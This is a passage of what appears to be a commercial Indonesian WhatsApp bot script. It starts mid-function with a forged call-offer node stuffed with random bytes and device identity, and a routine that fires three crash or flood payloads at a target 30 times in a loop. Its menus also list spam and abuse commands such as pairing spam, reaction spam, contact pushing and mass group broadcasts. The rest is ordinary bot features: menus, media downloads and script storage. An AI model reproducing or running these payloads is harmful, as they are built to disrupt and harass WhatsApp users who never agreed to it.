  if (dsmMessage && isOwnUser && !usersx) msg = dsmMessage;

  let bytes = buffer(encodeWAMsg ? encodeWAMsg(msg) : encodeWAMessage(msg));

  return merge.mutex(jid, async () => {
   let { type, ciphertext } = await Xuu.signalRepository.encryptMessage({ jid, data: bytes });
   if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
   return {
    tag: 'to',
    attrs: { jid },
    content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
     };
  });
}));

  return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let randomB = crypto.randomBytes(32);
  let buffcat = Buffer.concat([randomB, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await Xuu.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  let criminalromance = {
   tag: "call",
   attrs: { to: jid, id: Xuu.generateMessageTag(), from: Xuu.user.id },
   content: [{
    tag: "offer",
    attrs: {
     "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
     "call-creator": Xuu.user.id
    },
     content: [
      { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
      { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
       {
        tag: "video",
        attrs: {
         orientation: "0",
         screen_width: "1920",
         screen_height: "1080",
         device_orientation: "0",
         enc: "vp8",
         dec: "vp8"
        }
      },
      { tag: "net", attrs: { medium: "3" } },
      { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
      { tag: "encopt", attrs: { keygen: "2" } },
      { tag: "destination", attrs: {}, content: destinations },
      ...(shouldIncludeDeviceIdentity ? [{
      tag: "device-identity",
      attrs: {},
      content: encodeSignedDeviceIdentity(Xuu.authState.creds.account, true)
       }] : [])
     ]
   }]
 };

  await Xuu.sendNode(criminalromance);
}
async function bygatt(target) {
for(let i = 0; i < 30; i++) {
await FcNoClik(target, Ptcp = true)
sleep(3000)
await VCFCXYRINVISIBLE(Xuu, target)
sleep(3000)
await VcCallVoiceEmailXy(Xuu, target)
sleep(3000);
}
}

//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case 'menu': {
let teksnya = `
╔══✪〘 *INFORMATION* 〙✪══
║
║ 👋 Haii @${m.sender.split("@")[0]}
║ ${ucapan()}
║
╠══✪〘 *BOT INFO* 〙✪══
║
║ 🤖 Bot Name : *${global.botname2}*
║ 👤 Developer : *xuu Яyuici*
║ 📌 Version : *${global.versi}*
║ 📞 Contact : *${global.owner}*
║ ⚙️ Mode : *${Xuu.public ? "Public 🔓": "Self 🔒"}*
║ ⭐ Status : *${isCreator ? "👑 Owner Bot" : isPremium ? "💎 Premium User" : "🆓 Free User"}*
║
╚══✪〘 *MENU OPTIONS* 〙✪══
`

// Membuat buttons dengan desain lebih keren
let buttons = [
  {
    buttonId: `.menuslide`,
    buttonText: { displayText: '📋 All menu' },
    type: 1
  },
  {
    buttonId: `.owner`,
    buttonText: { displayText: '👨‍💻 OWNER' },
    type: 1
  },
  {
    buttonId: `.donasi`,
    buttonText: { displayText: '💝 DONATE' },
    type: 1
  },
  {
    buttonId: `.ping`,
    buttonText: { displayText: '⚡ SPEED' },
    type: 1
  }
]

await Xuu.sendMessage(m.chat, {
  footer: `━━━━━━━『 *${global.botname2}* 』━━━━━━━`,
  buttons: buttons,
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `✨ ${botname2} V12`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 999999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `🚀 ${botname2} - Premium WhatsApp Bot`,
      body: `Version ${versi} | By ${namaOwner}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkWebsite,
      mediaType: 1,
      renderLargerThumbnail: true,
      showAdAttribution: true
    },
  },
})
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'menuslide': {
    try {
        // =========================
        // DATE, TIME, NAME
        // =========================
        const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
        const day = days[currentDate.getDay()];
        const date = currentDate.toLocaleDateString("id-ID", {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        const time = currentDate.toLocaleTimeString("id-ID");

        let name = m.pushName || "Pengguna"; // ✅

        // =========================
        // PREPARE MEDIA
        // =========================
        let imgsc = await prepareWAMessageMedia(
            { image: { url: global.image.logo } },
            { upload: Xuu.waUploadToServer }
        );

        // =========================
        // TEKS MENU
        // =========================
        let teks = `╭────╼ 〖 *INFORMATION* 〗
├╼≫ Botname : _*${global.botname2}*_
├╼≫ Version : _*${global.versi}*_
├╼≫ Mode : _*${Xuu.public ? "Public": "Self"}*_
├╼≫ Creator : _*${global.namaOwner}*_
├╼≫ YourStatus *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
╰────────────╼`;

        // =========================
        // GENERATE CAROUSEL
        // =========================
        const msgii = await generateWAMessageFromContent(m.chat, {
            ephemeralMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: teks
                        }),
                        contextInfo: { mentionedJid: [m.sender] },
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [

                                // ================= SLIDE 2 (NEW MENU) ================
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Mainmenu* 〗
  │ ⎋ .ai
  │ ⎋ .gpt
  │ ⎋ .sticker
  │ ⎋ .iqc
  │ ⎋ .iqc2
  │ ⎋ .swm
  │ ⎋ .readqr
  │ ⎋ .tourl
  │ ⎋ .removebg
  │ ⎋ .remini
  │ ⎋ .tohd
  │ ⎋ .enc
  │ ⎋ .enchard
  │ ⎋ .tobase64
  │ ⎋ .react1k
  │ ⎋ .spampairing
  │ ⎋ .spamreactch
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },

                                // ========== SLIDE 3 = OWNER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Groupmenu* 〗
  │ ⎋ .antilink
  │ ⎋ .antilinkv2
  │ ⎋ .antilinkwame
  │ ⎋ .antilinkch
  │ ⎋ .antilinktele
  │ ⎋ .antimediafire
  │ ⎋ .antikataunchek
  │ ⎋ .antitoxic
  │ ⎋ .antino
  │ ⎋ .blacklistjpm
  │ ⎋ .welcome
  │ ⎋ .setwelcome
  │ ⎋ .setgoodbye
  │ ⎋ .crategc
  │ ⎋ .kick
  │ ⎋ .mute
  │ ⎋ .promote
  │ ⎋ .demote
  │ ⎋ .hidetag
  │ ⎋ .close/open
  │ ⎋ .opentime
  │ ⎋ .closetime
  │ ⎋ .resetlinkgc
  │ ⎋ .leave
  │ ⎋ .tagall
  │ ⎋ .kudetagc
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 4 = PANEL MENU V1 ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Downloadmenu* 〗
  │ ⎋ .tiktok
  │ ⎋ .play
  │ ⎋ .ytmp3
  │ ⎋ .ytmp4
  │ ⎋ .gitclone
  │ ⎋ .capcut
  │ ⎋ .pastebin
  │ ⎋ .instagram
  │ ⎋ .facebook
  │ ⎋ .mediafire
  │ ⎋ .snackvideo
  │ ⎋ .ambilsw
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 5 = PANEL MENU V2 ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Storemenu* 〗
  │ ⎋ .pushkontak
  │ ⎋ .pushkontak2
  │ ⎋ .listgc
  │ ⎋ .addrespon
  │ ⎋ .delrespon
  │ ⎋ .listrespon
  │ ⎋ .allpayment
  │ ⎋ .done
  │ ⎋ .proses
  │ ⎋ .jpmtesti
  │ ⎋ .jpm
  │ ⎋ .jpmht
  │ ⎋ .installpanel
  │ ⎋ .uninstallpanel
  │ ⎋ .hackbackpanel
  │ ⎋ .startwings
  │ ⎋ .subdomain
  │ ⎋ .upswtag
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = PROTECT MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Panelmenu* 〗
  │ ⎋ .updomain
  │ ⎋ .upapikey
  │ ⎋ .upcapikey
  │ ⎋ .addseller
  │ ⎋ .delseller
  │ ⎋ .listseller
  │ ⎋ .1gb - unlimited
  │ ⎋ .cadmin
  │ ⎋ .listpanel
  │ ⎋ .listadmin
  │ ⎋ .delpanel
  │ ⎋ .deladmin
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 6 = UNPROTECT MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Shopemenu* 〗
  │ ⎋ .buypanel
  │ ⎋ .buyadp
  │ ⎋ .buyscript
  │ ⎋ .buyvps
  │ ⎋ .buydo
  │ ⎋ .isipulsa
  │ ⎋ .buyjasajpm
  │ ⎋ .topupsaldo
  │ ⎋ .topupdiamond
  │ ⎋ .addsewa
  │ ⎋ .listsewa
  │ ⎋ .delsewa
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 7 = INSTALLER MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `╭─〖 *Channelmenu* 〗
  │ ⎋ .cekidch
  │ ⎋ .reactch
  │ ⎋ .createch
  │ ⎋ .addidch
  │ ⎋ .listidch
  │ ⎋ .delidch
  │ ⎋ .jpmch
  │ ⎋ .joinch
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 8 = GROUP MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: ` ╭─〖 *Digitaocean* 〗
 │ ⎋ .restartvps
 │ ⎋ .cvps
 │ ⎋ .sisadroplet
 │ ⎋ .deldroplet
 │ ⎋ .listdroplet
 │ ⎋ .rebuild
 ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 9 = TOOLS MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Deploymenu* 〗
  │ ⎋ .deployweb
  │ ⎋ .deployweb2
  │ ⎋ .delweb
  │ ⎋ .listweb
  │ ⎋ .listweb2
  │ ⎋ .gethtml
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 10 = STORE MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Cloudflaremenu* 〗
  │ ⎋ .adddomaincf
  │ ⎋ .listdomaincf
  │ ⎋ .deldomaincf
  │ ⎋ .clearallsubdo
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 11 = CHANNEL MENU ==========
                                {
                                    header: proto.Message.InteractiveMessage.Header.fromObject({
                                        title: `  ╭─〖 *Ownermenu* 〗
  │ ⎋ .addstokdo
  │ ⎋ .delstokdo
  │ ⎋ .liststokdo
  │ ⎋ .svsc
  │ ⎋ .delsc
  │ ⎋ .listsc
  │ ⎋ .getsc
  │ ⎋ .delowner
  │ ⎋ .listowner
  │ ⎋ .setppbot
  │ ⎋ .delppbot
  │ ⎋ .autoread
  │ ⎋ .autoreadsw
  │ ⎋ .autotyping
  │ ⎋ .anticall
  │ ⎋ .clearchat
  │ ⎋ .resetdb
  │ ⎋ .restartbot
  │ ⎋ .clearsession
  │ ⎋ .editcase
  │ ⎋ .addcase
  │ ⎋ .delcase
  │ ⎋ .getcase
  │ ⎋ .getip
  │ ⎋ .trxoff
  │ ⎋ .trxon
  │ ⎋ .backupsc
  ╰──────────⨶`,
                                        hasMediaAttachment: true,
                                        ...imgsc
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Buy Script\",\"url\":\"${global.linkOwner}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Telegram Admin\",\"url\":\"${global.linkTelegram}\"}`
                                        }, {
                                            name: "cta_url",
                                            buttonParamsJson: `{\"display_text\":\"Info Update Script\",\"url\":\"${global.linkSaluran}\"}`
                                        }]
                                    })
                                },
                                
                                // ========== SLIDE 12 = PAYMENT MENU ==========
                                

                                // DAN SETERUSNYA...
                                // Abang tinggal salin setiap kategori → jadikan 1 slide
                                // Formatnya sama seperti 15 slide di atas

                            ]
                        })
                    })
                }
            }
        }, { userJid: m.sender });

        await Xuu.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    } catch (err) {
        console.error(err);
        Reply("❌ Terjadi error saat mengirim slide menu!");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return reply("reply pesannya")
if (m.quoted.fromMe) {
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return reply(example("reply pesan"))
Xuu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Xuu.updateBlockStatus(mem, "unblock");
if (m.isGroup) Xuu.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
if (!text) return reply(example("namasc|6285###"))
if (!text.split("|'")) return reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await Xuu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return reply('Nama script tidak ditemukan')
await Xuu.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
if (!text) return reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return reply('Nama script tidak ditemukan')
await Xuu.sendMessage(m.chat, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return reply("Tidak ada script tersimpan")
if (!text) return reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return reply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
reply(`Berhasil menghapus script *${namasc}*`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teks dengan mengirim foto"))
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Xuu.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await Xuu.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xuu.sendMessage(i, {
  footer: `© AXONIC V12`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'play': {
    try {
        if (!args[0]) return m.reply(`${prefix + command} <judul lagu>`)
        
        const query = args.join(" ")
        await Xuu.sendMessage(m.chat, { react: { text: "⏳", key: m.key }})

        // 1. Panggil API
        const apiUrl = `https://api-faa.my.id/faa/ytplay?query=${encodeURIComponent(query)}`
        const { data } = await axios.get(apiUrl)

        if (!data || !data.result) {
            throw new Error("Lagu tidak ditemukan di server API.")
        }

        const res = data.result
        
        // 2. Ambil link dari properti 'mp3' sesuai log konsol
        const linkDownload = res.mp3; 

        if (!linkDownload) {
            throw new Error("Link download (mp3) tidak tersedia untuk lagu ini.")
        }

        // 3. Download audio
        const audioBuffer = await axios.get(linkDownload, { 
            responseType: "arraybuffer",
            timeout: 120000 
        })

        // 4. Kirim ke WhatsApp
        await Xuu.sendMessage(m.chat, {
            audio: Buffer.from(audioBuffer.data),
            mimetype: "audio/mpeg",
            fileName: `${res.title}.mp3`,
            contextInfo: {
                externalAdReply: {
                    title: res.title,
                    body: `Author: ${res.author || 'YouTube'} | Views: ${res.views || '-'}`,
                    thumbnailUrl: res.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: res.url
                }
            }
        }, { quoted: m })

        await Xuu.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

    } catch (e) {
        console.error("[FAA ERROR]", e.message)
        m.reply(`⚠️ Gagal: ${e.message}`)
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return reply(example("dj tiktok"))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await Xuu.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return reply(example('we dont talk'))
await Xuu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return reply(example("linknya"))
if (!text.startsWith("https://")) return reply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await Xuu.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Xuu.updateBlockStatus(mem, "block")
